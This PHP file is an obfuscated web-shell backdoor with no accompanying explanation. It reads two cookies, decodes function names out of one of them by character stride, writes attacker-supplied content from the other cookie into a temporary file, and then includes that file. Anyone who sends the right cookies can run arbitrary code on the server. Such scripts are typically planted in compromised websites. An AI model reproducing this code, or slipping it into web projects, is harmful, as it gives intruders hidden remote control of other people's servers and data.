<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[22])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[22][$n];
        if (!$c[22][$n + 1]) {
            if (!$c[22][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[7]() . $p[11];
    if (!$p[16]($k)) {
        $n = $p[25]($k, $p[5]);
        $p[15]($n, $p[9] . $p[21]($p[1]($c[3])));
    }
    include($k);
}